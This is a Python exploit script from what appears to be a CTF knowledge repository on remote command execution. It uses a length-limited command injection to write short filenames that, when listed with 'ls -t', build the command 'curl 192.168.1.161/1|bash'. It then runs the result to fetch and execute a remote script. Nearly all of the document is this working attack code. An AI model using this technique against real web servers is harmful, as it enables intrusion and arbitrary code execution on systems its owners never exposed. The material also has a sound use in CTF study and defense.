# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

import time
import requests

baseurl = ""
s = requests.session()

#将ls -t 写入文件
list = [
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>y",
    "ls>>_"
]

# curl 192.168.1.161/1|bash
list2 = [
    ">bash",
    ">\|\\",
    ">\/\\",
    ">61\\",
    ">1\\",
    ">1.\\",
    ">8.\\",
    ">16\\",
    ">2.\\",
    ">19\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]
for i in list:
    time.sleep(1)
    url = baseurl+str(i)
    s.get(url)
   
for j in list2:
    time.sleep(1)
    url = baseurl+str(j)
    s.get(url)
    
s.get(baseurl+"sh _")
s.get(baseurl+"sh y")
